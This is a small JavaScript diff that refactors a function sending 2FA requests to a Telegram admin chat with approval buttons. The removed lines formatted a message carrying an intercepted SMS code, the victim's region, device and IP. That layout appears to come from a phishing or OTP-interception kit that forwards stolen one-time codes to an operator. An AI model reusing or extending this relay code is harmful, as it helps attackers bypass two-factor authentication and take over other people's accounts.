@@ -22,14 +22,7 @@ function getApprovalStatus(requestId) {
 }
 
 // Send 2FA request to Telegram with inline buttons
-async function sendTelegram2FARequest({ code, region, device, ip, requestId }) {
-  const message =
-    `📨📨📨 <b>test - sms</b> 📨📨📨\n` +
-    `<b>💬 SMS:</b> <code>${code}</code>\n` +
-    `<b>🌍 Region:</b> ${region}\n` +
-    `<b>💻 Device:</b> ${device}\n` +
-    `<b>📡 IP:</b> ${ip}`;
-
+async function sendTelegram2FARequest({ message, requestId }) {
   await bot.sendMessage(ADMIN_CHAT_ID, message, {
     parse_mode: 'HTML',
     reply_markup: {
